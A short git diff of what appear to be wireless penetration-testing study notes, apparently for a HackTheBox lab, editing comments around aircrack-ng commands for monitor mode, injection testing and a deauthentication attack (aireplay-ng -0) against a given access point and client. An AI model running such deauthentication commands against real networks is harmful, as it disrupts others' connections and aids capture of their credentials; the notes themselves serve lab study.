@@ -65,8 +65,10 @@ sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png
 # to list all the features
 aireplay-ng
 
-# set wlan0mon to channel 11
+# set wlan0mon to channel 11 (11 is not 11. It's the channel you need)
 sudo iw dev wlan0mon set channel 11
+# or
+airmon-ng start wlan0 1
 
 # testing for packet injection
 sudo aireplay-ng --test wlan0mon
@@ -77,7 +79,7 @@ sudo airodump-ng wlan0mon
 # perform deauthentication 
 # -0 > deauthentication
 # 5 > number of deauths to send (0 = send continuously)
-# -a > access point -c > client (MAC)
+# -a > access point -c > client (MAC) <<MAC==MY_MACHINES_MAC>>
 sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
 
 
